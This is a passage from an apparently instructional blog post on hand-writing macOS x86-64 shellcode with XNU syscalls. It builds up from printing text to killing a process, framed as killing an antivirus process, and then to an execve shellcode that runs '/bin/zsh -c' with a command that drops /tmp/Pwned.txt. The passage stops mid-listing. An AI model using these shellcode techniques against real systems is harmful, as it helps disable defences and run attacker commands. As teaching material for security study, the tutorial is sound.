<code>foo</code> that takes three arguments.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">; Assume arg1, arg2, and arg3 are already set with appropriate values</span><br><span class=\"line\">mov rax, syscall_number</span><br><span class=\"line\">mov rdi, arg1 ; 1st argument</span><br><span class=\"line\">mov rsi, arg2 ; 2nd argument</span><br><span class=\"line\">mov rdx, arg3 ; 3rd argument</span><br><span class=\"line\">syscall      ; Execute syscall</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Calling-Conventions-Table\"><a href=\"#Calling-Conventions-Table\" class=\"headerlink\" title=\"Calling Conventions Table\"></a>Calling Conventions Table</h2><p>You can use this table as a reference.</p>\n<table>\n<thead>\n<tr>\n<th>Register</th>\n<th>Usage</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>RDI</code></td>\n<td>1st function argument</td>\n</tr>\n<tr>\n<td><code>RSI</code></td>\n<td>2nd function argument</td>\n</tr>\n<tr>\n<td><code>RDX</code></td>\n<td>3rd function argument (and optionally the 2nd return value)</td>\n</tr>\n<tr>\n<td><code>RCX</code></td>\n<td>4th function argument</td>\n</tr>\n<tr>\n<td><code>R8</code></td>\n<td>5th function argument</td>\n</tr>\n<tr>\n<td><code>R9</code></td>\n<td>6th function argument</td>\n</tr>\n<tr>\n<td><code>RAX</code></td>\n<td>Function return value&#x2F;Syscall Number</td>\n</tr>\n<tr>\n<td><code>RIP</code></td>\n<td>Instruction pointer</td>\n</tr>\n<tr>\n<td><code>RSP</code></td>\n<td>Stack pointer (must be 16-byte aligned before calls)</td>\n</tr>\n<tr>\n<td><code>RBP</code></td>\n<td>Frame pointer</td>\n</tr>\n<tr>\n<td><code>RBX</code></td>\n<td>Base pointer (optional use)</td>\n</tr>\n</tbody></table>\n<h1 id=\"Shellcoding\"><a href=\"#Shellcoding\" class=\"headerlink\" title=\"Shellcoding\"></a>Shellcoding</h1><p>Before writing our shellcode, To make it easy for ourselves instead of getting lost in all the assembly instructions, The best workflow to do is to write your code in <code>C</code>, then we convert it to assembly which will make it very easy for us, As there are references and resources for <code>C</code> it will make our process easier. For example, You would find people talking about how to make a client&#x2F;server in <code>C</code> using <code>socket</code>. But, you won‚Äôt find someone(‚Äúinsane‚Äù) talking about how to make a client&#x2F;server in assembly. So The process would be as the following:</p>\n<ul>\n<li>Find <code>C</code> functions that we will need in our code.</li>\n<li>Write our code in <code>C</code>.</li>\n<li>Turn our code into assembly.<ul>\n<li>Which including getting our syscall numbers ready.</li>\n<li>Function arguments and types.</li>\n</ul>\n</li>\n</ul>\n<p>Let‚Äôs go ahead and start with something simple to make things clear.</p>\n<h2 id=\"Print-‚ÄòHello‚Äô\"><a href=\"#Print-‚ÄòHello‚Äô\" class=\"headerlink\" title=\"Print ‚ÄòHello‚Äô\"></a>Print ‚ÄòHello‚Äô</h2><p>We will start by printing <code>Hello</code> into the screen. So let‚Äôs apply our workflow. Usually when we want to print something in <code>C</code>, we use <code>printf()</code> function as the following:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Now, As we identified the functions we need which is <code>printf()</code>, And we wrote our code the 3rd step is to turn it into assembly. So the first thing we would need is to get the syscall number for <code>printf()</code>, We can find all the <code>syscalls</code> can be found in <code>bsd/kern/syscalls.master</code>.  </p>\n<p><img src=\"/images/site/posts/macos/syscall-master.png\" alt=\"syscalls master snippet\"></p>\n<p>But, the thing is we won‚Äôt find <code>printf()</code> in the file. Let‚Äôs investigate the <code>printf()</code> function source code. After investigation, the implementation of <code>printf()</code> involves calling other functions till we reach <code>write</code> syscall.</p>\n<h3 id=\"Call-Chain-printf-‚Üí-write-Syscall\"><a href=\"#Call-Chain-printf-‚Üí-write-Syscall\" class=\"headerlink\" title=\"Call Chain: printf ‚Üí write Syscall\"></a>Call Chain: <code>printf</code> ‚Üí <code>write</code> Syscall</h3><table>\n<thead>\n<tr>\n<th>Step</th>\n<th>Function Name</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td><code>printf</code></td>\n</tr>\n<tr>\n<td>2</td>\n<td><code>vfprintf</code></td>\n</tr>\n<tr>\n<td>3</td>\n<td><code>__vfprintf_internal</code></td>\n</tr>\n<tr>\n<td>4</td>\n<td><code>Xprintf_buffer_write</code></td>\n</tr>\n<tr>\n<td>5</td>\n<td><code>_IO_new_file_overflow</code></td>\n</tr>\n<tr>\n<td>6</td>\n<td><code>_IO_do_write</code></td>\n</tr>\n<tr>\n<td>7</td>\n<td><code>new_do_write</code></td>\n</tr>\n<tr>\n<td>8</td>\n<td><code>_IO_SYSWRITE</code></td>\n</tr>\n<tr>\n<td>9</td>\n<td><code>__swrite</code> <em>(macOS only)</em></td>\n</tr>\n<tr>\n<td>10</td>\n<td><code>write</code> <em>(syscall)</em></td>\n</tr>\n</tbody></table>\n<p>You can find the source code files here:</p>\n<ul>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/stdio-common/printf.c.html\">printf.c</a></li>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf.c.html\">vfprintf.c</a></li>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/stdio-common/vfprintf-internal.c.html\">vfprintf-internal.c</a></li>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/stdio-common/printf_buffer.h.html\">printf_buffer.h</a></li>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/libio/fileops.c.html\">fileops.c</a></li>\n<li><a href=\"https://codebrowser.dev/glibc/glibc/libio/libioP.h.html\">libioP.h</a></li>\n</ul>\n<p>Also you could just have asked <code>ChatGPT</code> or something xD, But keep in mind with complicated shellcodes you would want to go through codes and else cause you always will learn something and upgrade yourself.</p>\n<p>Now, When we search for <code>write</code> syscall we can see it in the <code>syscalls.master</code> file:</p>\n<p><img src=\"/images/site/posts/macos/printf-callchain.png\" alt=\"printf call chain trace\"></p>\n<p>As we see the <code>write</code> syscall number is <code>4</code>. And <code>write</code> takes 3 arguments. We need to learn about these argument and how to use it, Which simple can be done by searching it or go to the documentation:</p>\n<p><img src=\"/images/site/posts/macos/printf-flow.png\" alt=\"printf flow diagram\"></p>\n<p>So from the description we can know that we need to supply the string pointer to <code>buf</code> the second argument and number of bytes (<code>length</code>) to the third argument <code>nbyte</code>, And for fields&#x2F;fd or File Descriptor, When we search it we will see that it takes the following values</p>\n<ul>\n<li><code>0 (STDIN_FILENO)</code>: Represents standard input, typically connected to the keyboard or the input of a pipe.</li>\n<li><code>1 (STDOUT_FILENO)</code>: Represents standard output, typically connected to the display or the output of a pipe.</li>\n<li><code>2 (STDERR_FILENO)</code>: Represents standard error, typically connected to the display for error messages.</li>\n</ul>\n<p>Our goal here is <code>STDOUT</code> which is value <code>1</code>. So our syscall will be as the following:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"type\">char</span> *message = <span class=\"string\">&quot;Hello&quot;</span>;</span><br><span class=\"line\">    write(<span class=\"number\">1</span>, message, <span class=\"number\">5</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs start with writing our shellcode:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\">\tmov rdi, 1 ; stdout for fd argument</span><br><span class=\"line\">\tmov rcx, &#x27;Hello&#x27; ; put our string value into RCX</span><br><span class=\"line\">\tpush rcx ; We push our string to the stack</span><br><span class=\"line\">\tmov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument</span><br><span class=\"line\">\tmov rdx, 5 ; nbytes argument (our string length)</span><br><span class=\"line\">\tmov rax, 0x2000004 ; The BSD syscall class entry + syscall number</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure>\n\n<p>Here our shellcode, starting with <code>bits 64</code> to enforce x86-64 mode and <code>global _main</code> to export the Mach-O entry point. The first instruction <code>mov rdi, 1</code> loads the file descriptor <code>1</code> (stdout) into <code>RDI</code>, the first argument register as we mentioned before. Next, <code>mov rcx, &#39;Hello&#39;</code> encodes the 5-character string as a 64-bit immediate <code>0x6f6c6c6548</code> (little-endian: <code>&#39;o&#39;,&#39;l&#39;,&#39;l&#39;,&#39;e&#39;,&#39;H&#39;</code>) into <code>RCX</code>. The <code>push rcx</code> then writes these 8 bytes to the stack, placing <code>&#39;H&#39;</code> at the new stack pointer and padding the remaining 3 bytes with zeros <code>0x00</code> to align the stack, Then <code>mov rsi, rsp</code> copies the current stack pointer into <code>RSI</code>, Which is the second argument, so it now points directly to the first character <code>&#39;H&#39;</code>, forming a valid <code>char *buf</code>. The <code>mov rdx, 5</code> sets the third argument, which is the number of bytes to write and exactly matching the length of <code>Hello</code>. Finally, <code>mov rax, 0x2000004</code> loads the <code>XNU</code> encoded syscall number: <code>(SYSCALL_CLASS_UNIX &lt;&lt; 24) | 4</code>, where class <code>2</code> routes to the BSD subsystem and <code>4</code> selects the <code>write</code> entry from <code>bsd/kern/syscalls.master</code>. The <code>syscall</code> instruction triggers the kernel trap, dispatching through <code>XNU</code>‚Äôs unified handler to execute <code>write(1, &quot;Hello&quot;, 5)</code>, printing <code>Hello</code> to the terminal.</p>\n<p>Let‚Äôs save our code into file <code>hello.asm</code> and compile our code.</p>\n<ul>\n<li>First we will turn the code to object file for <code>macho64</code> architecture using <code>nasm</code>:</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % nasm -f macho64 hello.asm</span><br><span class=\"line\">shellcoding % <span class=\"built_in\">ls</span></span><br><span class=\"line\">hello.asm\thello.o</span><br></pre></td></tr></table></figure>\n\n<p>As we see we got our object file <code>hello.o</code>.</p>\n<ul>\n<li>Second, We will link the required libraries needed for the code to generate the executable using <code>ld</code></li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macos 15.5 15.5</span><br><span class=\"line\">ld: warning: no platform load <span class=\"built_in\">command</span> found <span class=\"keyword\">in</span> <span class=\"string\">&#x27;hello.o&#x27;</span>, assuming: macOS</span><br><span class=\"line\">shellcoding % <span class=\"built_in\">ls</span></span><br><span class=\"line\">hello\t\thello.asm\thello.o</span><br></pre></td></tr></table></figure>\n\n<p>Here we can see after linking we got our executable.</p>\n<blockquote>\n<p>Note: The <code>-L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib</code> sets the <strong>library search path</strong> to the macOS 15.5 SDK‚Äôs <code>usr/lib</code> directory, ensuring the linker locates the correct version of <code>libSystem.tbd</code> ‚Äî Apple‚Äôs modern stub library format that resolves to <code>libSystem.dylib</code> at runtime. The <code>-lSystem</code> flag explicitly links against <strong>libSystem</strong>, the foundational system library that exports the <code>syscall</code> interface, <code>write</code>, <code>exit</code>, and all BSD&#x2F;POSIX functions; without it, the <code>syscall</code> instruction in our shellcode would remain unresolved, causing a linker error. Finally, <code>-platform_version macos 15.5 15.5</code> declares the <strong>minimum deployment target</strong> as macOS 15.5 (Sequoia), embedding the <code>LC_VERSION_MIN_MACOSX</code> load command and forcing the use of Sequoia-compatible API stubs and system call encodings ‚Äî essential for forward and backward compatibility on modern Apple silicon and Intel systems.</p>\n</blockquote>\n<ul>\n<li>Let‚Äôs run and test our executable:</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % ./hello </span><br><span class=\"line\">Hellozsh: segmentation fault  ./hello</span><br></pre></td></tr></table></figure>\n\n<p>We see that our execution results in <code>segmentation fault</code>, And the reason for that the program doesn‚Äôt <code>return</code> or in simple words exit. For example, Within the main function in <code>C</code>, When return is used in the main function (e.g., <code>return 0;</code>), it typically translates to an <code>exit_group</code> system call (<code>exit</code>). This system call terminates the entire process and returns the specified exit status to the operating system. So, We need to exit after executing our <code>write</code> syscall.</p>\n<h2 id=\"Exit\"><a href=\"#Exit\" class=\"headerlink\" title=\"Exit\"></a>Exit</h2><p>We can exit using <code>exit</code> syscall, as we can see it in the <code>syscalls.master</code> file:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>\tAUE_EXIT\tALL\t&#123; <span class=\"type\">void</span> <span class=\"title function_\">exit</span><span class=\"params\">(<span class=\"type\">int</span> rval)</span> NO_SYSCALL_STUB; &#125;</span><br></pre></td></tr></table></figure>\n\n<p>The syscall number is <code>1</code> and it takes only 1 integer argument <code>rval</code> which is the value to return. When we go to documentation the <code>rval</code> value can be <code>0</code> for <code>EXIT_SUCCESS</code> (successful execution of a program) or <code>EXIT_FAILURE</code> (unsuccessful execution of a program). Let‚Äôs update our shellcode and add <code>exit</code> syscall</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\">\tmov rdi, 1 ; stdout for fd argument</span><br><span class=\"line\">\tmov rcx, &#x27;Hello&#x27; ; put our string value into RCX</span><br><span class=\"line\">\tpush rcx ; We push our string to the stack</span><br><span class=\"line\">\tmov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument</span><br><span class=\"line\">\tmov rdx, 5 ; nbytes argument (our string length)</span><br><span class=\"line\">\tmov rax, 0x2000004 ; The BSD syscall class entry + write syscall number</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall</span><br><span class=\"line\">\tmov rdi, 0 ; arg int rval</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure>\n\n<p>Now, let‚Äôs repeat the process of compiling to get our executable again and test it.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % nasm -f macho64 hello.asm</span><br><span class=\"line\">shellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5</span><br><span class=\"line\">ld: warning: no platform load <span class=\"built_in\">command</span> found <span class=\"keyword\">in</span> <span class=\"string\">&#x27;/Users/zeyadazima.com/shellcoding/hello.o&#x27;</span>, assuming: macOS</span><br><span class=\"line\">shellcoding % ./hello </span><br><span class=\"line\">Hello%                                                           </span><br><span class=\"line\">shellcoding % </span><br></pre></td></tr></table></figure>\n\n<p>As we see clearly our code worked perfectly. </p>\n<h2 id=\"Kill-a-Process\"><a href=\"#Kill-a-Process\" class=\"headerlink\" title=\"Kill a Process\"></a>Kill a Process</h2><p>Let‚Äôs do another shellcode, And take a scenario in case we found a way to execute a code with high privileges and We need to write a shellcode to kill the <code>AV</code> process.</p>\n<p>The <code>C</code> code to kill a process is as the following:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span> <span class=\"comment\">// For pid_t</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span>    <span class=\"comment\">// For getpid() (optional, for self-killing example)</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">pid_t</span> target_pid;</span><br><span class=\"line\"></span><br><span class=\"line\">    target_pid = <span class=\"number\">12345</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sending SIGTERM (graceful termination)</span></span><br><span class=\"line\">    kill(target_pid, SIGTERM);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>We can see here we used <code>kill</code> function and supply the <code>PID</code> and the signal which is <code>SIGTERM</code>.</p>\n<p>Now, If we search for <code>kill</code> in <code>syscalls.master</code>. We can find it:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">37</span>\tAUE_KILL\tALL\t&#123; <span class=\"type\">int</span> <span class=\"title function_\">kill</span><span class=\"params\">(<span class=\"type\">int</span> pid, <span class=\"type\">int</span> signum, <span class=\"type\">int</span> posix)</span> NO_SYSCALL_STUB; &#125;</span><br></pre></td></tr></table></figure>\n\n<p>For the <code>PID</code> we will create a test process and get it‚Äôs <code>PID</code> to supply it for the first argument and for the <code>signum</code> argument, In the <code>C</code> code the value is <code>SIGTERM</code> which it will be a pre-defined value in the source code, We can search for <code>#define SIGTERM</code> in the <code>XNU</code> source code, We will find it at <code>xnu-xnu-11417.121.6/bsd/sys/signal.h:103</code>:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGKILL 9       <span class=\"comment\">/* kill (cannot be caught or ignored) */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGBUS  10      <span class=\"comment\">/* bus error */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGSEGV 11      <span class=\"comment\">/* segmentation violation */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGSYS  12      <span class=\"comment\">/* bad argument to system call */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGPIPE 13      <span class=\"comment\">/* write on a pipe with no one to read it */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGALRM 14      <span class=\"comment\">/* alarm clock */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGTERM 15      <span class=\"comment\">/* software termination signal from kill */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGURG  16      <span class=\"comment\">/* urgent condition on IO channel */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGSTOP 17      <span class=\"comment\">/* sendable stop signal not from tty */</span></span></span><br></pre></td></tr></table></figure>\n\n<p>So we can see that <code>SIGTERM</code> value is <code>15</code>, But the better option to use <code>SIGKILL</code> with value <code>9</code> as it will be forced and kill (cannot be caught or ignored). We will supply <code>9</code> as the second argument. Now, In the <code>C</code> code it doesn‚Äôt have a 3rd argument as we see for the <code>syscall</code>. If we search for <code>int posix</code> in the <code>XNU</code> source code, We gonna find the following code under <code>xnu-xnu-11417.121.6/bsd/kern/kern_sig.c:1373</code>:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\"><span class=\"title function_\">kill</span><span class=\"params\">(<span class=\"type\">proc_t</span> cp, <span class=\"keyword\">struct</span> kill_args *uap, __unused <span class=\"type\">int32_t</span> *retval)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">proc_t</span> p;</span><br><span class=\"line\">\t<span class=\"type\">kauth_cred_t</span> uc = kauth_cred_get();</span><br><span class=\"line\">\t<span class=\"type\">int</span> posix = uap-&gt;posix;         <span class=\"comment\">/* !0 if posix behaviour desired */</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tAUDIT_ARG(pid, uap-&gt;pid);</span><br><span class=\"line\">\tAUDIT_ARG(signum, uap-&gt;signum);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((u_int)uap-&gt;signum &gt;= NSIG) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EINVAL;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>We can see from apple comment on the source code that, if we want <code>POSIX</code> behaviour in killing the process we have to supply anything other than <code>0</code>. And after more searching and asking diff <code>AI</code> chatbots i got the following:</p>\n<table>\n<thead>\n<tr>\n<th>Value</th>\n<th>Meaning</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>posix = 0</code></td>\n<td>Mach (legacy) signal behavior</td>\n</tr>\n<tr>\n<td><code>posix = 1</code> (or any <code>!0</code>)</td>\n<td>POSIX&#x2F;BSD signal behavior</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>Note: usually when you see extra arguments that was not mentioned or supplyed in the <code>C</code> code, It means that the argument is optional and not really required so you always can supply <code>0</code> or <code>NULL</code> as a value to the optional&#x2F;non-required arguments.<br>Let‚Äôs run our test process using a simple infinity loop running in background:</p>\n</blockquote>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % <span class=\"keyword\">while</span> <span class=\"literal\">true</span>; <span class=\"keyword\">do</span> <span class=\"built_in\">sleep</span> 10; <span class=\"keyword\">done</span> &amp;</span><br><span class=\"line\">[2] 27646</span><br><span class=\"line\">shellcoding % ps -p 27646</span><br><span class=\"line\">  PID TTY           TIME CMD</span><br><span class=\"line\">27646 ttys061    0:00.01 -zsh</span><br></pre></td></tr></table></figure>\n<p>the <code>PID</code> is <code>27646</code></p>\n<p>Now, Lets write our shellcode:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\">\tmov rdi, 27646 ; 1st argument PID</span><br><span class=\"line\">\tmov rsi, 9 ; 2nd argument signum</span><br><span class=\"line\">\tmov rdx, 0 ; 3rd argument posix</span><br><span class=\"line\">\tmov rax, 0x2000025 ; The BSD syscall class entry + 0x25 (which is 37 in hex) kill syscall</span><br><span class=\"line\">\tsyscall</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall</span><br><span class=\"line\">\tmov rdi, 0 ; arg int rval</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure>\n\n<p>It‚Äôs already clear here, We passed our arguments as the following; <code>PID</code> for <code>RDI</code>, then <code>signum</code> for <code>RSI</code> and After that, <code>posix</code> to <code>RDX</code> and setup our <code>syscall</code>. Finally, We exit gracefully using <code>exit</code> syscall.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % nasm -f macho64 killer.asm                                                                                                       </span><br><span class=\"line\">shellcoding % ld -o killer killer.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5</span><br><span class=\"line\">ld: warning: no platform load <span class=\"built_in\">command</span> found <span class=\"keyword\">in</span> <span class=\"string\">&#x27;/Users/zeyadazima.com/shellcoding/killer.o&#x27;</span>, assuming: macOS</span><br><span class=\"line\">shellcoding % ./killer </span><br><span class=\"line\">shellcoding % </span><br><span class=\"line\">[2]  - killed     <span class=\"keyword\">while</span> <span class=\"literal\">true</span>; <span class=\"keyword\">do</span>; <span class=\"built_in\">sleep</span> 10; <span class=\"keyword\">done</span></span><br><span class=\"line\">shellcoding % ps -p 27646</span><br><span class=\"line\">  PID TTY           TIME CMD</span><br></pre></td></tr></table></figure>\n\n<p>As we can see clearly, The process has been killed successfully.</p>\n<h2 id=\"Execute-Command\"><a href=\"#Execute-Command\" class=\"headerlink\" title=\"Execute Command\"></a>Execute Command</h2><p>Now, The exciting parts where we need to execute commands. Let‚Äôs bring our <code>C</code> code to execute commands on the system. Which is usually in <code>C</code> it‚Äôs done through <code>system()</code> function. But remember that on the <code>XNU</code> has <code>BSD</code>. So Let‚Äôs search for <code>C</code> code where execute commands using <code>BSD</code> functions.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/wait.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">pid_t</span> pid;</span><br><span class=\"line\">    <span class=\"type\">char</span> *<span class=\"type\">const</span> argv[] = &#123;<span class=\"string\">&quot;/bin/ls&quot;</span>, <span class=\"string\">&quot;-l&quot;</span>, <span class=\"literal\">NULL</span>&#125;; <span class=\"comment\">// Command and its arguments</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *<span class=\"type\">const</span> envp[] = &#123;<span class=\"literal\">NULL</span>&#125;; <span class=\"comment\">// Environment variables (can be customized)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    execve(argv[<span class=\"number\">0</span>], argv, envp);</span><br><span class=\"line\">   </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>As we can see here it uses <code>execv()</code> function and it takes 3 arguments. lET‚ÄôS SEARCH FOR it in the <code>syscalls.master</code>:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">59</span>\tAUE_EXECVE\tALL\t&#123; <span class=\"type\">int</span> <span class=\"title function_\">execve</span><span class=\"params\">(<span class=\"type\">char</span> *fname, <span class=\"type\">char</span> **argp, <span class=\"type\">char</span> **envp)</span> NO_SYSCALL_STUB; &#125;</span><br></pre></td></tr></table></figure>\n\n<p>So it takes a pointer to the <code>fname</code> which is the file name, then pointer to array <code>argp</code> and pointer to another array <code>envp</code>.</p>\n<p><img src=\"/images/site/posts/macos/write-syscall-chain.png\" alt=\"write syscall chain snippet\"></p>\n<p>We can see that in the description of <code>execve()</code>, the first argument is the path to the binary we want to execute which is gonna be the shell in this case <code>/bin/zsh</code>. Then for the second argument it takes array the arguments of the executable or program we passing and the first element in the array has to be the same file name <code>/bin/zsh</code>, So the array will be as the following, if we want to execute<code>echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt</code>  command <code>&#123;&quot;/bin/zsh&quot;,&quot;-c&quot;,&quot;echo &#39;W00tW00t&#39; &gt; /tmp/Pwned.txt&quot;&#125;</code>. The third argument as mentioned is optional so we can supply a pointer to <code>NULL</code> array.</p>\n<p>Let‚Äôs go on and write our shellcode:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\"></span><br><span class=\"line\">\tmov rcx, 0 \t; NULL Terminator</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br><span class=\"line\">\tmov rdx, &#x27;/bin/zsh&#x27; \t;  our file/executable name</span><br><span class=\"line\">\tpush rdx \t; push the file/executable name to the stack</span><br><span class=\"line\">\tmov rdi, rsp \t; fname =&gt; 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name</span><br><span class=\"line\">\tmov rbx, &#x27;-c&#x27; \t; argp[1] =&gt; the 2nd element in the arguments array</span><br><span class=\"line\">\tpush rbx \t; push argp[1] to the stack</span><br><span class=\"line\">\tmov rbx, rsp \t; save the argp[1](&#x27;-c&#x27;) pointer to RBX</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs stop here for a while, We need to place our 3rd element which is our command <code>echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt</code>, Which is for a string to long and to divide it to push it on the stack will not be the best thing our shellcode will be so long. Instead we gonna use a trick to place it on the stack for example:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">call array</span><br><span class=\"line\">db &#x27;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#x27;, 0</span><br></pre></td></tr></table></figure>\n\n<p><code>call</code> pushes the address of the following <code>db</code> string onto the stack. Which will make it easier for us.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\"></span><br><span class=\"line\">\txor rcx, rcx \t; NULL Terminator</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br><span class=\"line\">\tmov rdx, &#x27;/bin/zsh&#x27; \t;  our file/executable name</span><br><span class=\"line\">\tpush rdx \t; push the file/executable name to the stack</span><br><span class=\"line\">\tmov rdi, rsp \t; fname =&gt; 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name</span><br><span class=\"line\">\tmov rbx, 